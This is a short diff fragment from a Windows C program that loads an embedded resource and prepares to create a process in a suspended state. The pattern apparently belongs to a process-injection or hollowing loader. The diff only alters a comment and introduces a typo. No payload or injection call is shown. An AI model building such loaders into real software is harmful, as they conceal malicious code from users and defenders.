@@ -33,7 +33,7 @@ int main() {
     DWORD code199kLen;
     loadResource_with("dhanushcode56", &code199k, &code199kLen);
 
-    // Create a new process in a suspended state
+    // Create a new process in a suspended stat
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
